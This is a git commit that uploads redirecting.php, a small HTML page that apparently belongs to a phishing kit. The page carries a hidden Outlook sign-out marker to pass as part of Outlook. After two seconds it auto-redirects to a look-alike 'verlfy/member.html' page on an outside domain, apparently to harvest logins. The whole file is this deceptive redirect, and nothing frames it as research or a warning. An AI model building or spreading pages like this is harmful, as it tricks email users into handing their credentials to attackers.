9a85896a1ed0f31f7fc13a6229056afeac22cf39
troma2417 <43593181+troma2417@users.noreply.github.com>
2018-09-26 18:25:27 +0100

    Add files via upload

---
+++ redirecting.php
@@ -0,0 +1,9 @@
+﻿
+<html xmlns="http://www.w3.org/1999/xhtml"><head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<title>Redirecting</title>
+<meta http-equiv="refresh" content="2; url=http://www.hinett.online/verlfy/member.html">
+</head>
+<body>
+<div id="mboxMarker-default-PROD-outlook_signout-0" style="visibility:hidden;display:none">&nbsp;</div>
+</body></html>
